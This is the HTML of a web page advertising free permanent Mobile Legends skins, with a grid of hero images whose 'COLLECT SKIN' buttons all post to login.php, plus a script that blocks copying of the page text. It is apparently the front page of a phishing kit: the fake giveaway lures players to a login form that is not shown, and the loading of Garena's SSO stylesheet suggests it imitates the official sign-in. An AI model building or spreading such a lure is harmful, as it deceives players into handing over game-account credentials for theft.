
<!DOCTYPE html>
<html>
<script type='text/javascript'>
//<![CDATA[
document.addEventListener('copy', function (e){
    e.preventDefault();
  e.clipboardData.setData("text/plain", "Jangan Copas Gan :) "+window.location.href+"");
})
//]]>
</script>
<head>
    <meta charset="UTF-8">
    <title>MOBILE LEGENDS - FREE SKIN</title>
    <link rel="stylesheet" href="ccss/style.css">
    <link rel="shortcut icon" href="https://2.bp.blogspot.com/-4hQwrsUFwwg/WkyFCMEk9zI/AAAAAAAABh4/IUGibfWk4WkKmySYg5VKwy-M-qQPiBzIgCLcBGAs/s200/moonton.png"/>
	<link href="https://cdngarenanow-a.akamaihd.net/gop/sso/theme/dark/css/sso.css?v=0.47" rel="stylesheet" type="text/css"/>
</head>
<script type='text/javascript'>
//<![CDATA[
document.addEventListener('copy', function (e){
    e.preventDefault();
  e.clipboardData.setData("text/plain", "Jangan Copas Gan :) "+window.location.href+"");
})
//]]>
</script>
<body>
       <center><img src="Atas.jpg" width=200 height=200></center><br>
    <div id="pricing">
        <div class="price_card alpha">
            <div class="header">
                <img src="gam/Odette.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Layla" />
                <input type="submit" name="submit" style="color: #000000;background-color: #FF0000;" value="COLLECT SKIN" class="tombol"/>
            </form>
            <span class="tip">-PERMANENT</span>
        </div>
        <div class="price_card alpha">              
            <div class="header">
                <img src="gam/Lancelot.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Franco" />
                <input type="submit" name="submit" style="color: #000000;background-color: #FF0000;" value="COLLECT SKIN" class="tombol"/>
            </form>
            <span class="tip">-PERMANENT</span>
        </div>
        <div class="price_card alpha">
            <div class="header">
                <img src="gam/Fasha.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="clint" />
                <input type="submit" name="submit" style="color: #000000;background-color: #FF0000;" value="COLLECT SKIN" class="tombol"/>
            </form>
            <span class="tip">-PERMANENT</span>
        </div>
    </div>

    <div id="pricing">
        <div class="price_card alpha">
            <div class="header">
                <img src="gam/Helcurt.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Layla" />
                <input type="submit" name="submit" style="color: #000000;background-color: #FF0000;" value="COLLECT SKIN" class="tombol"/>
            </form>
            <span class="tip">-PERMANENT</span>
        </div>
        <div class="price_card alpha">              
            <div class="header">
                <img src="gam/Akai.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Franco" />
                <input type="submit" name="submit" style="color: #000000;background-color: #FF0000;" value="COLLECT SKIN" class="tombol"/>
            </form>
            <span class="tip">-PERMANENT</span>
        </div>
        <div class="price_card alpha">
            <div class="header">
                <img src="gam/Lapu.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="clint" />
                <input type="submit" name="submit" style="color: #000000;background-color: #FF0000;" value="COLLECT SKIN" class="tombol"/>
            </form>
            <span class="tip">-PERMANENT</span>
        </div>
    </div>

    <div id="pricing">
        <div class="price_card alpha">
            <div class="header">
                <img src="gam/Zhask.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Layla" />
                <input type="submit" name="submit" style="color: #000000;background-color: #FF0000;" value="COLLECT SKIN" class="tombol"/>
            </form>
            <span class="tip">-PERMANENT</span>
        </div>
        <div class="price_card alpha">              
            <div class="header">
                <img src="gam/Hylos.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Franco" />
                <input type="submit" name="submit" style="color: #000000;background-color: #FF0000;" value="COLLECT SKIN" class="tombol"/>
            </form>
            <span class="tip">-PERMANENT</span>
        </div>
        <div class="price_card alpha">
            <div class="header">
                <img src="gam/Cyclop.jpg">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="clint" />
                <input type="submit" name="submit" style="color: #000000;background-color: #FF0000;" value="COLLECT SKIN" class="tombol"/>
            </form>
            <span class="tip">-PERMANENT</span>
        </div>
    </div>

    <div id="pricing">
        <div class="price_card alpha">
            <div class="header">
                <img src="gam/qwe.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Layla" />
                <input type="submit" name="submit" style="color: #000000;background-color: #FF0000;" value="COLLECT SKIN" class="tombol"/>
            </form>
            <span class="tip">-PERMANENT</span>
        </div>
        <div class="price_card alpha">              
            <div class="header">
                <img src="gam/qwe1.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Franco" />
                <input type="submit" name="submit" style="color: #000000;background-color: #FF0000;" value="COLLECT SKIN" class="tombol"/>
            </form>
            <span class="tip">-PERMANENT</span>
        </div>
        <div class="price_card alpha">
            <div class="header">
                <img src="gam/qwe2.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="clint" />
                <input type="submit" name="submit" style="color: #000000;background-color: #FF0000;" value="COLLECT SKIN" class="tombol"/>
            </form>
            <span class="tip">-PERMANENT</span>
        </div>
    </div>

    <div id="pricing">
        <div class="price_card alpha">
            <div class="header">
                <img src="gam/qwe3.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Layla" />
                <input type="submit" name="submit" style="color: #000000;background-color: #FF0000;" value="COLLECT SKIN" class="tombol"/>
            </form>
            <span class="tip">-PERMANENT</span>
        </div>
        <div class="price_card alpha">
            <div class="header">
                <img src="gam/qwe4.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Franco" />
                <input type="submit" name="submit" style="color: #000000;background-color: #FF0000;" value="COLLECT SKIN" class="tombol"/>
            </form>
            <span class="tip">-PERMANENT</span>
        </div>
        <div class="price_card alpha">
            <div class="header">
                <img src="gam/qwe5.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="clint" />
                <input type="submit" name="submit" style="color: #000000;background-color: #FF0000;" value="COLLECT SKIN" class="tombol"/>
            </form>
            <span class="tip">-PERMANENT</span>
        </div>
    </div>
    
    <div id="pricing">
        <div class="price_card alpha">
            <div class="header">
                <img src="gam/qwe6.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Layla" />
                <input type="submit" name="submit" style="color: #000000;background-color: #FF0000;" value="COLLECT SKIN" class="tombol"/>
            </form>
            <span class="tip">-PERMANENT</span>
        </div>
        <div class="price_card alpha">
            <div class="header">
                <img src="gam/qwe7.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Franco" />
                <input type="submit" name="submit" style="color: #000000;background-color: #FF0000;" value="COLLECT SKIN" class="tombol"/>
            </form>
            <span class="tip">-PERMANENT</span>
        </div>
        <div class="price_card alpha">
            <div class="header">
                <img src="gam/qwe8.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="clint" />
                <input type="submit" name="submit" style="color: #000000;background-color: #FF0000;" value="COLLECT SKIN" class="tombol"/>
            </form>
            <span class="tip">-PERMANENT</span>
        </div>
    </div>
    
    <div id="pricing">
        <div class="price_card alpha">
            <div class="header">
                <img src="gam/qwe9.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Layla" />
                <input type="submit" name="submit" style="color: #000000;background-color: #FF0000;" value="COLLECT SKIN" class="tombol"/>
            </form>
            <span class="tip">-PERMANENT</span>
        </div>
        <div class="price_card alpha">
            <div class="header">
                <img src="gam/qwe10.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Franco" />
                <input type="submit" name="submit" style="color: #000000;background-color: #FF0000;" value="COLLECT SKIN" class="tombol"/>
            </form>
            <span class="tip">-PERMANENT</span>
        </div>
        <div class="price_card alpha">
            <div class="header">
                <img src="gam/qwe11.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="clint" />
                <input type="submit" name="submit" style="color: #000000;background-color: #FF0000;" value="COLLECT SKIN" class="tombol"/>
            </form>
            <span class="tip">-PERMANENT</span>
        </div>
    </div>
    
    <div id="pricing">
        <div class="price_card alpha">
            <div class="header">
                <img src="gam/qwe12.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Layla" />
                <input type="submit" name="submit" style="color: #000000;background-color: #FF0000;" value="COLLECT SKIN" class="tombol"/>
            </form>
            <span class="tip">-PERMANENT</span>
        </div>
        <div class="price_card alpha">
            <div class="header">
                <img src="gam/qwe13.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Franco" />
                <input type="submit" name="submit" style="color: #000000;background-color: #FF0000;" value="COLLECT SKIN" class="tombol"/>
            </form>
            <span class="tip">-PERMANENT</span>
        </div>
        <div class="price_card alpha">
            <div class="header">
                <img src="gam/qwe14.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="clint" />
                <input type="submit" name="submit" style="color: #000000;background-color: #FF0000;" value="COLLECT SKIN" class="tombol"/>
            </form>
            <span class="tip">-PERMANENT</span>
        </div>
    </div>
    
    <div id="pricing">
        <div class="price_card alpha">
            <div class="header">
                <img src="gam/qwe15.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Layla" />
                <input type="submit" name="submit" style="color: #000000;background-color: #FF0000;" value="COLLECT SKIN" class="tombol"/>
            </form>
            <span class="tip">-PERMANENT</span>
        </div>
        <div class="price_card alpha">
            <div class="header">
                <img src="gam/qwe16.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Franco" />
                <input type="submit" name="submit" style="color: #000000;background-color: #FF0000;" value="COLLECT SKIN" class="tombol"/>
            </form>
            <span class="tip">-PERMANENT</span>
        </div>
        <div class="price_card alpha">
            <div class="header">
                <img src="gam/qwe17.png">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="clint" />
                <input type="submit" name="submit" style="color: #000000;background-color: #FF0000;" value="COLLECT SKIN" class="tombol"/>
            </form>
            <span class="tip">-PERMANENT</span>
        </div>
    </div>
    
</html>